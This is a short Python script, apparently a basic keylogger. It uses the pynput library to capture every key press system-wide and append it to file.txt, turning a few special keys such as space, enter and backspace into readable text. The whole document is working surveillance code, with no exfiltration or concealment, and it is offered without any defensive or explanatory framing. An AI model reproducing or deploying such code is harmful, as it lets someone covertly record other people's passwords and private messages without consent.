'''f = open('file.txt', 'w')
f.write('adfgsfdgfh')
f.close()'''
# All imports
from pynput.keyboard import Listener #1
import tempfile

# functions
def writetofile(key):
    char = str(key)
    # replacing keystrokes in file.txt with actual meaning
    keystroke = ["'",'Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
    value = ["", "", " ", "\n", '<backspace>', '']
    for j in range(len(keystroke)):
        if keystroke[j] == char:
            char = char.replace(keystroke[j], value[j])
    with open("file.txt", 'a') as f:
        f.write(char)


with Listener(on_press=writetofile) as l:
    l.join()
